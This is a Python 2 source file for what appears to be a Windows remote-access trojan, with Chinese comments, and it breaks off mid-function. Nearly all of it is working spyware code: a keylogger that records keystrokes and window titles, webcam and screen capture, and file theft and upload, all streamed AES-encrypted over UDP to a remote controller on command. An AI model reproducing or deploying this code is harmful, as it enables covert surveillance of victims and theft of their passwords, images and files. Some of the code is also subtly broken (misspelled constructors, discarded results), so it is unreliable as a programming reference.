#!/usr/bin/env python
# -*-coding:utf8-*-
# python 2.7

from ctypes import *
from Crypto.Cipher import AES
from PIL import ImageGrab
import pyHook
import pythoncom
import win32clipboard
import time
import win32con
import win32api
import os
import socket
import threading
from threading import Lock,Event
from Queue import *
import cv2
import numpy
import math
import random
import binascii
from tkMessageBox import *
from hashlib import md5

password="abcdefg"
key=binascii.unhexlify(md5(password).hexdigest())
static_AES = AES.new(key, AES.MODE_ECB)

'''
数据包构成=包类型|包序号|包内容
包类型包括如下:
0:数据长度等信息包
1:通信数据包
2:接收确认包
3:缺包列表请求
'''
flag=False
user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
split_len=60000
wait_time=40
time_out=1
client_dict=dict()

command_list=["getFile","sendFile","getVideo","getSVideo","keyHook"]
def key_hook():
    def get_current_process():

        # 获取最上层的窗口句柄
        hwnd = user32.GetForegroundWindow()
        # 获取进程ID
        pid = c_ulong(0)
        user32.GetWindowThreadProcessId(hwnd, byref(pid))

        # 将进程ID存入变量中
        process_id = "%d" % pid.value

        # 申请内存
        executable = create_string_buffer("\x00" * 512)
        h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

        psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

        # 读取窗口标题
        windows_title = create_string_buffer("\x00" * 512)
        length = user32.GetWindowTextA(hwnd, byref(windows_title), 512)

        # 打印
        file_name = "key_logs.txt"
        path = os.path.join(BASE_DIR, file_name)
        key_logs = open(path, 'a')
        time_now = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        print >> key_logs, ("\n\n[%s PID:%s-%s-%s]:\n" % (time_now, process_id, executable.value, windows_title.value))
        #print "\n[%s PID:%s-%s-%s]:\n" % (time_now, process_id, executable.value, windows_title.value)
        key_logs.close()

        # 关闭handles
        kernel32.CloseHandle(hwnd)
        kernel32.CloseHandle(h_process)

        # 定义击键监听事件函数6

    def KeyStroke(event):
        global current_window
        file_name = "key_logs.txt"
        path = os.path.join(BASE_DIR, file_name)
        # 检测目标窗口是否转移(换了其他窗口就监听新的窗口)
        if event.WindowName != current_window:
            current_window = event.WindowName
            # 函数调用
            get_current_process()

            # 检测击键是否常规按键（非组合键等）
        if event.Ascii > 32 and event.Ascii < 127:
            key_logs = open(path, 'a')
            print >> key_logs, ("%s " % chr(event.Ascii)),
            print("%s " % chr(event.Ascii)),#test
            key_logs.close()

        else:
            key_logs = open(path, 'a')
            print >> key_logs, ("[%s] " % event.Key),
            print("[%s] " % event.Key),
            key_logs.close()
            # 循环监听下一个击键事件
        return True

    kl = pyHook.HookManager()
    kl.KeyDown = KeyStroke
    # 注册hook并执行
    kl.HookKeyboard()
    pythoncom.PumpMessages()


def keyReact(sock,Addr):
    t = threading.Thread(target=key_hook, args=())#创建线程
    t.start()
    sock.sendto("key_hook is start.", Addr)#回复控制端

def HexToBin(hex):
    msg = ""
    for char in hex:
        temp = bin(int(char, 16))[2:]
        if len(temp) < 4:
            msg += '0' * (4-len(temp))
        msg += temp
    return msg

def BinToHex(bin):
    msg = ""
    i = 0
    while(i < len(bin)):
        msg += hex(int(bin[i:i+4], 2))[2:]
        i += 4
    return msg

#十进制整数转128位二进制比特函数
def IntToBin128(num):
    bin=""
    s=int(num)
    r=0
    while(True):
        r=s%2
        s=s/2
        bin=str(r)+bin
        if s==0:
            break
    bin=(128-len(bin))*"0"+bin
    return bin

#将字符串扩展为16字节的整数倍，及128比特位的整数倍
def str16add(in_str):
    r=len(in_str)%16
    return in_str+"|"+(15-r)*"*"

#将补全的字符串还原
def str16del(in_str):
    place=in_str.rfind("|")
    return in_str[:place]

#根据0-2^128的大整数生成字符串密钥key
def num2key(num):
    bin=IntToBin128(num)
    hex=BinToHex(bin)
    key=binascii.unhexlify(hex)
    return key

class Keyhook:
    def __int__(self,sock,**kw):
        self.flag=False
        self.Addr=("0.0.0.0",0)
        self.sock=sock
        for k, v in kw.iteritems():
            setattr(self, k, v)
    def get_current_process(self):

        # 获取最上层的窗口句柄
        hwnd = user32.GetForegroundWindow()
        # 获取进程ID
        pid = c_ulong(0)
        user32.GetWindowThreadProcessId(hwnd, byref(pid))

        # 将进程ID存入变量中
        process_id = "%d" % pid.value

        # 申请内存
        executable = create_string_buffer("\x00" * 512)
        h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

        psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

        # 读取窗口标题
        windows_title = create_string_buffer("\x00" * 512)
        length = user32.GetWindowTextA(hwnd, byref(windows_title), 512)

        # 打印
        file_name = "key_logs.txt"
        path = os.path.join(BASE_DIR, file_name)
        key_logs = open(path, 'a')
        time_now = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        print >> key_logs, ("\n\n[%s PID:%s-%s-%s]:\n" % (time_now, process_id, executable.value, windows_title.value))
        key_logs.close()
        win_info="0|"+("\n\n[%s PID:%s-%s-%s]:\n" % (time_now, process_id, executable.value, windows_title.value))
        win_info=str16add(win_info)
        win_info=static_AES.encrypt(win_info)
        #print "\n[%s PID:%s-%s-%s]:\n" % (time_now, process_id, executable.value, windows_title.value)
        if self.flag:
            self.sock.sendto(win_info,self.Addr)
            try:
                reply=client_dict[self.Addr][1].get(True,1)
                reply=static_AES.decrypt(reply)
                reply=str16del(reply)
            except:
                self.flag=False
                client_dict.pop(self.Addr)
        # 关闭handles
        kernel32.CloseHandle(hwnd)
        kernel32.CloseHandle(h_process)

        # 定义击键监听事件函数

    def setAddr(self,Addr):
        self.Addr=Addr
    def run(self):
        self.flag=True
    def quit(self):
        self.flag=True
    def KeyStroke(self,event):
        global current_window
        file_name = "key_logs.txt"
        path = os.path.join(BASE_DIR, file_name)
        # 检测目标窗口是否转移(换了其他窗口就监听新的窗口)
        if event.WindowName != current_window:
            current_window = event.WindowName
            # 函数调用
            self.get_current_process()

            # 检测击键是否常规按键（非组合键等）
        print("flag="+str(self.flag))
        if event.Ascii > 32 and event.Ascii < 127:
            key_logs = open(path, 'a')
            print >> key_logs, ("%s " % chr(event.Ascii)),
            #print("%s " % chr(event.Ascii)),#test
            key_logs.close()
            key_text=("%s " % chr(event.Ascii))
            key_text = "1|" + key_text
            key_text = str16add(key_text)
            key_text = static_AES.encrypt(key_text)
        else:
            key_logs = open(path, 'a')
            print >> key_logs, ("[%s] " % event.Key),
            #print("[%s] " % event.Key),
            key_logs.close()
            key_text = ("[%s] " % event.Key)
            # 循环监听下一个击键事件
            key_text="1|"+key_text
            key_text=str16add(key_text)
            key_text=static_AES.encrypt(key_text)

        if self.flag:
            self.sock.sendto(key_text, self.Addr)
            print("send ok")
            try:
                reply = client_dict[self.Addr][1].get(True, 1)
                reply = static_AES.decrypt(reply)
                reply = str16del(reply)
            except:
                print ("reply Falied.")
                self.flag = False
                client_dict.pop(self.Addr)
        return True
    def start(self):
        kl = pyHook.HookManager()
        kl.KeyDown = self.KeyStroke
        # 注册hook并执行
        kl.HookKeyboard()
        pythoncom.PumpMessages()

class Camera:
    def __int__(self):
        self.flag=True

    def send_video_im(self,sock,Addr):
        sock.settimeout(1)
        cap = cv2.VideoCapture(0)  # 实例化摄像头
        while (True):
            try:
                st_msg="start"
                st_msg=str16add(st_msg)
                st_msg=static_AES.encrypt(st_msg)
                sock.sendto(st_msg, Addr)
                print ("start sent.")
                break
            except socket.timeout:
                print("TimeOut")
                return 0
            except socket.error:
                continue
        '''T = time.time()
        seed = int(T)
        random.seed(seed)
        num = random.randint(0, 2 ** 128 - 1)
        key = num2key(num)
        c = AES.new(key, AES.MODE_ECB)'''
        temp = 0

        while (self.flag):

            ret, frame = cap.read()  # 获取图片
            # frame.thumbnail((640, 360))
            img_encode = cv2.imencode(".jpg", frame)[1]
            img_code = numpy.array(img_encode)  # 编码
            im_data = img_code.tostring()
            # 加密
            '''data = str16add(im_data)

            img_data = c.encrypt(data)'''
            # 编码后的长度
            #im_data=str16add(im_data)
            #im_data=static_AES.encrypt(im_data)
            im_len = len(im_data)
            # 片数，以split_len=60000字节为单位进行分片,取不小于其的最大整数
            count = int(math.ceil(float(im_len) / split_len))

            try:
                len_data="0|"+str(im_len)
                len_data=str16add(len_data)
                len_data=static_AES.encrypt(len_data)
                sock.sendto(len_data, Addr)
            except:
                print ("send len error.")
                continue
            reply = ""
            while (True):
                try:
                    #client_dict[Addr][0].acquire()
                    reply = client_dict[Addr][1].get(True,1)
                    reply=static_AES.decrypt(reply)
                    reply = str16del(reply)
                    #client_dict[Addr][0].release()
                    print "len="+reply
                    break
                except:
                    print "接受len确认信息失败"
                    return

            if not reply.startswith("0"):
                continue
            '''id = 0
            r_id = ""
            num = random.randint(0, 2 ** 128 - 1)
            key = num2key(num)
            c = AES.new(key, AES.MODE_ECB)'''
            group_len = 100
            # 每个包数据长度，单位字节
            pack_len = 60000
            # 首位初始包序
            start = 0
            end = start + group_len
            # 缺包序列列表，初始为空
            request_list = []
            fp=0
            while(True):
                # 若尾包位大于总数据包数，说明文件小于每个校验分组group_len
                # 或者此时为最末尾的一个分组
                # 此时需要进行修正
                if count < end:
                    end = count
                    counter = count
                # 若缺包列表为空，则表示无缺包信息，开始接收下一组
                if (len(request_list) == 0):
                    # 按序读取文件
                    for id in range(start, end):
                        data = im_data[fp:fp+pack_len]
                        fp+=pack_len
                        try:
                            # 每个包以 序号|数据 的形式发送
                            c_data="1|"+str(id) + "|" + data
                            c_data=str16add(c_data)
                            c_data=static_AES.encrypt(c_data)
                            sock.sendto(c_data, Addr)
                            print ("sent id:" + str(id))
                        except socket.error:
                            print ("socket error2")
                            continue
                # 若缺包列表为不为空，说明接收端要求进行指定包的重发
                else:
                    print ("重发")
                    # 记录当前文件指针
                    #place = fp.tell()
                    # 取出缺包的每个序列
                    for item in request_list:
                        item = int(item)
                        # 重新移动文件指针，读取数据并按格式发送
                        #fp.seek(item * pack_len)
                        data = "1|"+str(item) + "|" + im_data[item:item+pack_len]
                        data = str16add(data)
                        data=static_AES.encrypt(data)
                        try:
                            sock.sendto(data, Addr)
                            print ("retry id %d sent." % item)
                        except socket.timeout:
                            print("timeout1.")
                        except socket.error:
                            print("socket error2.Client is exit.")
                            #fp.close()
                            return
                    # 重发完毕，数据指针还原归位
                    #fp.seek(place)
                # 接收接受端的反馈信息
                while (True):
                    try:
                        #client_dict[Addr][0].acquire()
                        reply = client_dict[Addr][1].get(True,1)

                        reply = static_AES.decrypt(reply)
                        reply = str16del(reply)
                        #client_dict[Addr][0].release()
                        print ("finish="+reply)
                        break
                    except:
                        print "接受反馈信息失败"
                        return
                    '''except socket.timeout:
                        print("Timeout2,client exit.")
                        continue
                        #return
                    except socket.error:
                        print("socket error3.Client is exit.")
                        #fp.close()
                        return'''

                # 如果收到finish指令，说明当前组数据包全部成功接收
                if (reply.startswith("2")):
                    # 尾包序等于总包数，说明文件以发送完毕
                    if end == count:
                        print ("All finish.")
                        start=0
                        end =start+pack_len
                        break
                    # 否则移动首尾包序，清空缺包列表，准备接收下一组
                    start += group_len
                    end += group_len
                    request_list = []
                # 收到的不是finish指令，则收到的是缺包列表
                if reply.startswith("3"):
                    # 转换为列表
                    reply[2:].strip("[]").split(",")
                    print (request_list)

        cap.release()
        sock.close()
        return

    def start(self,sock,Addr):
        self.flag=True
        self.send_video_im(sock,Addr)

    def send_stop(self):
        self.flag=False

class Screen:
    def __init__(self):
        self.flag=False

    def start(self, sock, Addr):
        self.flag = True
        self.send_video_im(sock, Addr)

    def send_stop(self):
        self.flag = False
    def send_video_im(self,sock,Addr):
        sock.settimeout(1)
        while (True):
            try:
                cmd="start"
                cmd=str16add(cmd)
                cmd=static_AES.encrypt(cmd)
                sock.sendto(cmd, Addr)
                print ("start sent.")
                break
            except socket.timeout:
                print("TimeOut")
                return 0
            except socket.error:
                continue
        '''T = time.time()
        seed = int(T)
        random.seed(seed)
        num = random.randint(0, 2 ** 128 - 1)
        key = num2key(num)
        c = AES.new(key, AES.MODE_ECB)'''
        temp = 0

        while (self.flag):

            im = ImageGrab.grab()  # 获取屏幕图片
            im.thumbnail((640, 360))  # 压缩
            im = numpy.asarray(im)
            # 色彩及编码
            frame = cv2.cvtColor(im, cv2.COLOR_RGB2BGR)
            img_encode = cv2.imencode(".jpg", frame)[1]
            img_code = numpy.array(img_encode)  # 编码
            im_data = img_code.tostring()
            # 加密
            '''data = str16add(im_data)

            img_data = c.encrypt(data)'''
            # 编码后的长度
            im_len = len(im_data)
            # 片数，以split_len=60000字节为单位进行分片,取不小于其的最大整数
            count = int(math.ceil(float(im_len) / split_len))

            try:
                len_data="0|" + str(im_len)
                len_data=str16add(len_data)
                len_data=static_AES.encrypt(len_data)
                sock.sendto(len_data, Addr)

            except:
                print ("send len error.")
                continue
            reply = ""
            while (True):
                try:
                    # client_dict[Addr][0].acquire()
                    reply = client_dict[Addr][1].get(True,1)
                    # client_dict[Addr][0].release()
                    reply=static_AES.decrypt(reply)
                    reply=str16del(reply)
                    print "len=" + reply
                    break
                except:
                    print "接受len确认信息失败"
                    return

            if not reply.startswith("0"):
                continue
            '''id = 0
            r_id = ""
            num = random.randint(0, 2 ** 128 - 1)
            key = num2key(num)
            c = AES.new(key, AES.MODE_ECB)'''
            group_len = 100
            # 每个包数据长度，单位字节
            pack_len = 60000
            # 首位初始包序
            start = 0
            end = start + group_len
            # 缺包序列列表，初始为空
            request_list = []
            fp = 0
            while (True):
                # 若尾包位大于总数据包数，说明文件小于每个校验分组group_len
                # 或者此时为最末尾的一个分组
                # 此时需要进行修正
                if count < end:
                    end = count
                    counter = count
                # 若缺包列表为空，则表示无缺包信息，开始接收下一组
                if (len(request_list) == 0):
                    # 按序读取文件
                    for id in range(start, end):
                        data = im_data[fp:fp + pack_len]
                        fp += pack_len
                        try:
                            # 每个包以 序号|数据 的形式发送
                            s_data="1|" + str(id) + "|" + data
                            s_data=str16add(s_data)
                            s_data=static_AES.encrypt(s_data)
                            sock.sendto(s_data, Addr)
                            print ("sent id:" + str(id))
                        except socket.error:
                            print ("socket error2")
                            continue
                # 若缺包列表为不为空，说明接收端要求进行指定包的重发
                else:
                    print ("重发")
                    # 记录当前文件指针
                    # place = fp.tell()
                    # 取出缺包的每个序列
                    for item in request_list:
                        item = int(item)
                        # 重新移动文件指针，读取数据并按格式发送
                        # fp.seek(item * pack_len)
                        data = "1|" + str(item) + "|" + im_data[item:item + pack_len]
                        data=str16add(data)
                        data=static_AES.encrypt(data)
                        try:
                            sock.sendto(data, Addr)
                            print ("retry id %d sent." % item)
                        except socket.timeout:
                            print("timeout1.")
                        except socket.error:
                            print("socket error2.Client is exit.")
                            # fp.close()
                            return
                    # 重发完毕，数据指针还原归位
                    # fp.seek(place)
                # 接收接受端的反馈信息
                while (True):
                    try:
                        # client_dict[Addr][0].acquire()
                        reply = client_dict[Addr][1].get(True,1)
                        reply=static_AES.decrypt(reply)
                        reply=str16del(reply)
                        # client_dict[Addr][0].release()
                        print ("finish=" + reply)
                        break
                    except:
                        print "接受反馈信息失败"
                        return
                    '''except socket.timeout:
                        print("Timeout2,client exit.")
                        continue
                        #return
                    except socket.error:
                        print("socket error3.Client is exit.")
                        #fp.close()
                        return'''

                # 如果收到finish指令，说明当前组数据包全部成功接收
                if (reply.startswith("2")):
                    # 尾包序等于总包数，说明文件以发送完毕
                    if end == count:
                        start=0
                        end=start+pack_len
                        print ("All finish.")
                        break
                    # 否则移动首尾包序，清空缺包列表，准备接收下一组
                    start += group_len
                    end += group_len
                    request_list = []
                # 收到的不是finish指令，则收到的是缺包列表
                if reply.startswith("3"):
                    # 转换为列表
                    request_list = reply[2:].strip("[]").split(",")
                    print (request_list)
        return


class File:
    def __int__(self):
        self.sendFlag=True
        self.recFlag=True
        self.pack_len=2048

    def send(self,sock,Addr):
        #sock.sendto("path")
        sock.settimeout(time_out)
        command=""
        while(True):
            try:
                command,addr=sock.recvfrom(1024)
                break
            except socket.timeout:
                print("Timeout,sever closed.")
                return
            except socket.error:
                print "socket error."
                continue
        file_path=""
        print "command="+command
        #取出文件路径信息
        try:
            file_path=command.split("|")[1]
        except:
            print("Path error.")
            pass
        file_size=0
        print file_size
        #获取文件的大小，若错误则返回提示信息。
        try:
            file_size = os.stat(file_path).st_size
            #sock.sendto("open success.",Addr)
            print("file_size="+str(file_size))
        except:
            print("file size failed.")
            sock.sendto("open failed",Addr)
            return
        cup=100
        pack_len=2048
        fgroup = int(file_size) / (cup * pack_len)
        end_count = int(math.ceil(float(int(file_size) % (cup * pack_len)) / pack_len))
        while(True):
            #发送文件大小信息
            try:
                sock.sendto(str(file_size),Addr)
                break
            except:
                print ("send failed.")
                continue
        reply=""
        #接收客户端确认收到文件大小的信息
        times = 10
        while(True):

            try:
                reply,addr=sock.recvfrom(1024)
                break
            except socket.timeout:
                times=times-1
                print("Timeout.")
                if(times==0):
                    print("客户端已退出连接。")
                    return
            except socket.error:
                print("retry.")
                continue
        print(reply)
        #未收到确认信息，关闭程序
        if(reply!="file_size get"):
            print "return"
            return
        #已发送的数据计数
        has_sent=0
        with open(file_path,"rb") as fp:
            while(has_sent!=file_size):
                r_id=""
                #100为一组，id为组内包的序号
                group = 0
                id = 0
                while(has_sent!=file_size):
                    #读取文件，大小为2048字节
                    date=fp.read(2048)
                    while(True):
                        #发送，成功则跳出，失败则重发
                        try:
                            sock.sendto(str(id)+"|"+date,Addr)
                            #print("success.")
                            print ("send ID="+str(id))
                            has_sent+=len(date)
                            break
                        except:
                            print("send failed.")
                            continue
                    id=id+1
                    r_id = ""
                    #print("ID="+str(id))
                    #本组已发完或者文件已发完
                    if(id==100 or has_sent==file_size):
                        print ("file size=%d,has sent=%d" % (file_size, has_sent))
                        #接收反馈信息
                        times = 10
                        while(True):
                            try:
                                r_id,addr=sock.recvfrom(1024)
                                #接受到finish表示该组数据已成功发送
                                print r_id
                                if(r_id=="finish"):
                                    group = group + 1
                                    id = 0
                                    break
                                #否则接受到的是缺包最小序列号
                                else:
                                    id=int(r_id)
                                    #重新定位到文件指针位置
                                    fp.seek((group*100+id)*2048,0)
                                    has_sent=fp.tell()
                                    break
                            except socket.timeout:
                                times = times - 1
                                print("超时")
                                if (times == 0):
                                    print("客户端已退出连接。")
                                    return
                            except socket.error:
                                #print ("retry error.")
                                #time.sleep(10000)
                                continue


        print "all finish."

    def send_t(self,sock,Addr):
        #设置超时时间，1s
        self.sendFlag=True
        sock.settimeout(1)
        while (True):
            try:
                command, addr = sock.recvfrom(1024)
                break
            #超时继续
            except socket.timeout:
                print("Timeout.")
                continue
            #其它套接字错误则退出程序
            except socket.error:
                print "socket error."
                break
        #接收到的是绝对路径的文件
        file_name=command
        #获取文件大小
        try:
            file_size=os.stat(file_name).st_size
        except:
            #获取失败则发送错误信息，可能文件不存在或者路径错误
            print("open file failed.")
            sock.sendto("open failed.",Addr)
            #关闭服务端
            return
        #获取成功，则将文件大小信息发送至接收端
        while(True):
            try:
                sock.sendto(str(file_size),Addr)
                break
            except socket.error:
                print("socket error1.Client is exit.")
                return
        '''5.10 '''
        #每组包数
        group_len=100
        #每个包数据长度，单位字节
        pack_len = 60000
        #首位初始包序
        start = 0
        end = start+group_len
        #数据包总数，等于最大包序减1
        count = int(math.ceil(float(file_size) / pack_len))
        #缺包序列列表，初始为空
        request_list = []
        #打开文件
        with open(file_name,"rb") as fp:
            counter=100
            while(self.sendFlag):
                # 若尾包位大于总数据包数，说明文件小于每个校验分组group_len
                # 或者此时为最末尾的一个分组
                # 此时需要进行修正
                if count<end:
                    print "end"
                    end=count
                    counter=count
                # 若缺包列表为空，则表示无缺包信息，开始接收下一组
                if(len(request_list)==0):
                    #按序读取文件
                    for id in range(start,end):
                        data=fp.read(pack_len)
                        try:
                            #每个包以 序号|数据 的形式发送
                            sock.sendto(str(id)+"|"+data,Addr)
                            print ("sent id:"+str(id))
                        except socket.error:
                            print ("socket error2")
                            continue
                # 若缺包列表为不为空，说明接收端要求进行指定包的重发
                else:
                    print ("重发")
                    #记录当前文件指针
                    place=fp.tell()
                    #取出缺包的每个序列
                    for item in request_list:
                        item=int(item)
                        #重新移动文件指针，读取数据并按格式发送
                        fp.seek(item*pack_len)
                        data=str(item)+"|"+fp.read(pack_len)
                        try:
                            sock.sendto(data,Addr)
                            print ("retry id %d sent."%item)
                        except socket.timeout:
                            print("timeout1.")
                        except socket.error:
                            print("socket error2.Client is exit.")
                            fp.close()
                            return
                    #重发完毕，数据指针还原归位
                    fp.seek(place)
                #接收接受端的反馈信息
                while(True):
                    try:
                        reply,addr=sock.recvfrom(2048)
                        print (reply)
                        break
                    except socket.timeout:
                        print("Timeout2,client exit.")
                        #continue
                        return
                    except socket.error:
                        print("socket error3.Client is exit.")
                        fp.close()
                        return
                #如果收到finish指令，说明当前组数据包全部成功接收
                if(reply=="finish"):
                    #尾包序等于总包数，说明文件以发送完毕
                    if end==count:
                        print ("All finish.")
                        return
                    #否则移动首尾包序，清空缺包列表，准备接收下一组
                    start+=group_len
                    end+=group_len
                    request_list=[]
                #收到的不是finish指令，则收到的是缺包列表
                else:
                    #转换为列表
                    request_list=reply.strip("[]").split(",")
                    print (request_list)
        return
    def send_im(self,sock,Addr):
        #设置超时时间，1s
        self.sendFlag=True
        sock.settimeout(1)
        while (True):
            try:
                command=client_dict[Addr][1].get(True,1)
                command=static_AES.decrypt(command)
                command=str16del(command)
                break
            #超时继续
            except:
                print("file name get failed.")
                return
        #接收到的是绝对路径的文件
        file_name=command
        #获取文件大小
        print ("filename="+file_name)
        try:
            file_size=os.stat(file_name).st_size
        except:
            #获取失败则发送错误信息，可能文件不存在或者路径错误
            print("open file failed.")
            sock.sendto("open failed.",Addr)
            #关闭服务端
            return
        #获取成功，则将文件大小信息发送至接收端
        while(True):
            try:
                info="0|"+str(file_size)
                info=str16add(info)
                info=static_AES.encrypt(info)
                sock.sendto(info,Addr)
                break
            except socket.error:
                print("socket error1.Client is exit.")
                return
        '''5.10 '''
        #每组包数
        group_len=100
        #每个包数据长度，单位字节
        pack_len = 60000
        #首位初始包序
        start = 0
        end = start+group_len
        #数据包总数，等于最大包序减1
        count = int(math.ceil(float(file_size) / pack_len))
        #缺包序列列表，初始为空
        request_list = []
        #打开文件
        with open(file_name,"rb") as fp:
            counter=100
            while(self.sendFlag):
                # 若尾包位大于总数据包数，说明文件小于每个校验分组group_len
                # 或者此时为最末尾的一个分组
                # 此时需要进行修正
                if count<end:
                    print "end"
                    end=count
                    counter=count
                # 若缺包列表为空，则表示无缺包信息，开始接收下一组
                if(len(request_list)==0):
                    #按序读取文件
                    for id in range(start,end):
                        data=fp.read(pack_len)
                        try:
                            #每个包以 序号|数据 的形式发送
                            f_data="1|"+str(id)+"|"+data
                            f_data=str16add(f_data)
                            f_data=static_AES.encrypt(f_data)
                            sock.sendto(f_data,Addr)
                            print ("sent id:"+str(id))
                        except socket.error:
                            print ("socket error2")
                            continue
                # 若缺包列表为不为空，说明接收端要求进行指定包的重发
                else:
                    print ("重发")
                    #记录当前文件指针
                    place=fp.tell()
                    #取出缺包的每个序列
                    for item in request_list:
                        item=int(item)
                        #重新移动文件指针，读取数据并按格式发送
                        fp.seek(item*pack_len)
                        data="1|"+str(item)+"|"+fp.read(pack_len)
                        data=str16add(data)
                        data=static_AES.encrypt(data)
                        try:
                            sock.sendto(data,Addr)
                            print ("retry id %d sent."%item)
                        except socket.timeout:
                            print("timeout1.")
                        except socket.error:
                            print("socket error2.Client is exit.")
                            fp.close()
                            return
                    #重发完毕，数据指针还原归位
                    fp.seek(place)
                #接收接受端的反馈信息
                while(True):
                    try:
                        reply=client_dict[Addr][1].get(True,1)
                        reply=static_AES.decrypt(reply)
                        reply=str16del(reply)
                        print (reply)
                        break
                    except:
                        print("reply is none.Client is exit.")
                        fp.close()
                        return
                #如果收到finish指令，说明当前组数据包全部成功接收
                if(reply.startswith("2")):
                    #尾包序等于总包数，说明文件以发送完毕
                    if end==count:
                        print ("All finish.")
                        return
                    #否则移动首尾包序，清空缺包列表，准备接收下一组
                    start+=group_len
                    end+=group_len
                    request_list=[]
                #收到的不是finish指令，则收到的是缺包列表
                if (reply.startswith("3")):
                    #转换为列表
                    reply=reply[2:]
                    request_list=reply.strip("[]").split(",")
                    print (request_list)
                else:
                    pass
        return

    def stop_send(self):
        self.sendFlag=False
    def stop_recv(self):
        self.recFlag=False

    def receive(self,sock,Addr):
        sock.settimeout(0.1)
        info=""
        file_size=0
        file_name=""
        while(True):
            try:
                info,addr=sock.recvfrom(65535)
                info=static_AES.decrypt(info)
                info=str16del(info)
                break
            except socket.timeout:
                print("Timeout1.")
                continue
            except socket.error:
                print("socket error1.")
                return
        # 将文件绝对路径发送至服务端
        print("info="+info)
        file_size=info.split("|")[0]
        file_name=info.split("|")[1]
        if info:
            try:
                fp=open(file_name,"wb")
                s_t="start"
                s_t=str16add(s_t)
                s_t=static_AES.encrypt(s_t)
                sock.sendto(s_t,Addr)
                fp.close()
            except IOError:
                print("No this File.")
                sock.sendto("open failed",Addr)
                return
        # 校验组长度，100为一组
        group_len = 100
        # 每个包长度，单位字节
        pack_len = 60000
        # 起始包序和终止包序
        start = 0
        end = start + group_len
        # 缺包序列列表，存储每组的缺包信息
        request_list = []
        # 临时数据字典，存储每组数据
        data_dict = {}
        # 计算总包数
        count = int(math.ceil(float(file_size) / pack_len))
        print ("count=" + str(count))
        print("file_size=" + str(file_size))
        # 以二进制方式打开文件
        with open(file_name, "wb") as fp:
            while (True):
                # 若尾包位大于总数据包数，说明文件小于每个校验分组group_len
                # 或者此时为最末尾的一个分组
                # 此时需要进行修正
                if (end > count):
                    end = count
                # 若缺包列表为空，则表示无缺包信息，开始接收下一组
                if (len(request_list) == 0):
                    print ("start=%d,end=%d" % (start, end))
                    # 接收包序为[start，end)之间的数据包
                    for i in range(start, end):
                        times = 3
                        print ("i=" + str(i))
                        # 接收数据，超时接收下一个包，套接字错误则说明客户端已断开连接，退出
                        while (True):
                            try:
                                pack, addr = sock.recvfrom(65535)
                                pack=static_AES.decrypt(pack)
                                pack=str16del(pack)
                                # 将序号和数据分离，按序存入字典
                                ID = pack[:pack.find("|")]

                                if int(ID)>=start and int(ID)<end:
                                    data = pack[pack.find("|") + 1:]
                                    data_dict[int(ID)] = data
                                    print ("ID " + str(ID) + "get")
                                else:
                                    print ("not in ID " + str(ID) + "get")
                                break
                            except socket.timeout:
                                print("Timeout1.0.")
                                # times=times-1
                                # if times==0:
                                break
                            except socket.error:
                                print("socket error.")
                                return
                # 若缺包序列不为空，说明有缺包情况，需要进行接收重发包
                else:
                    for i in request_list:
                        # 依次接收数据包
                        while (True):
                            try:
                                pack, addr = sock.recvfrom(65535)
                                pack=static_AES.decrypt(pack)
                                pack=str16del(pack)
                                # 将序号和数据分离，存入字典
                                ID = pack[:pack.find("|")]
                                if int(ID) >= start and int(ID) < end:
                                    data = pack[pack.find("|") + 1:]
                                    print ("re ID " + str(ID) + "get")
                                    data_dict[int(ID)] = data
                                break
                            except socket.timeout:
                                print("Timeout2.")
                                #continue
                                return
                            except socket.error:
                                print("socket error.")
                                return
                print ("Check.")
                flag = True
                # 每组包进行校验
                for i in range(start, end):
                    if i not in data_dict.keys():
                        print ("%d lost" % i)
                        # 发现缺包，标志位置false，并且将序列号添加至缺包序列中
                        flag = False
                        if i not in request_list:
                            request_list.append(i)

                # 根据标志位判断有无缺包
                if (flag):
                    # 无缺包，说明该组收到的包是完整的，发送finish指令进行确认
                    print "finish."
                    finish="finish"
                    finish=str16add(finish)
                    finish=static_AES.encrypt(finish)
                    sock.sendto(finish, Addr)
                    # 按序写入文件
                    for i in range(start, end):
                        try:
                            fp.write(data_dict[i])
                        except KeyError:
                            print ("Key error.")
                            print ("Start=%d,end=%d" % (start, end))
                            print data_dict.keys()
                            return
                    # 若末尾包序等于总包数，则说明整个文件接收完毕
                    if end == count:
                        for i in range(start,end):
                            if len(data_dict[i])==0:
                                print "Dict["+str(i)+"] is NULL"
                        print ("All finish.")
                        start=0
                        end=start+group_len
                        return
                    # 其它情况则移动首位包序位
                    start += group_len
                    end += group_len
                    # 清空数据字典和缺包序列着两个临时数据区
                    data_dict = {}
                    request_list = []
                # 有缺包情况，发送缺包序列
                else:
                    request=str(request_list)
                    request=str16add(request)
                    request=static_AES.encrypt(request)
                    sock.sendto(str(request_list), Addr)

    def receive_im(self,sock,Addr):
        sock.settimeout(0.1)
        info=""
        file_size=0
        file_name=""
        while(True):
            try:

                info=client_dict[Addr][1].get(True,1)
                info=static_AES.decrypt(info)
                info=str16del(info)
                break
            except:
                print("info get failed.")
                return
        # 将文件绝对路径发送至服务端
        info=info[2:]
        print("info="+info)
        file_size=info.split("|")[0]
        file_name=info.split("|")[1]
        if info:
            try:
                fp=open(file_name,"wb")
                s_t="start"
                s_t=str16add(s_t)
                s_t=static_AES.encrypt(s_t)
                sock.sendto(s_t,Addr)
                print "start sent"
                fp.close()
            except IOError:
                print("No this File.")
                sock.sendto("open failed",Addr)
                return
        # 校验组长度，100为一组
        group_len = 100
        # 每个包长度，单位字节
        pack_len = 60000
        # 起始包序和终止包序
        start = 0
        end = start + group_len
        # 缺包序列列表，存储每组的缺包信息
        request_list = []
        # 临时数据字典，存储每组数据
        data_dict = {}
        # 计算总包数
        count = int(math.ceil(float(file_size) / pack_len))
        print ("count=" + str(count))
        print("file_size=" + str(file_size))
        # 以二进制方式打开文件
        with open(file_name, "wb") as fp:
            while (True):
                # 若尾包位大于总数据包数，说明文件小于每个校验分组group_len
                # 或者此时为最末尾的一个分组
                # 此时需要进行修正
                if (end > count):
                    end = count
                # 若缺包列表为空，则表示无缺包信息，开始接收下一组
                if (len(request_list) == 0):
                    print ("start=%d,end=%d" % (start, end))
                    # 接收包序为[start，end)之间的数据包
